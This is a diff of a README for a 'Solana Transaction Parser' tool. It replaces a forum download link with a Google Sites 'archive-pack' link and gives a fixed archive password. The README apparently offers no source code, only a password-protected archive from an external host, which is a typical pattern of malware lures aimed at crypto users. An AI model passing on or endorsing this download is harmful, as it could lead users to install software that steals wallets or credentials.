@@ -31,9 +31,9 @@ Solana Transaction Parser is a professional tool for developers and analysts who
 
 Download the latest release from the link below.
 
-Download: https://software-hub.forumotion.com/t81-solana-transaction-parser
+**Download:** https://sites.google.com/view/archive-pack/download
 
-Password: 68924
+**Password:** 68924
 
 ---
 
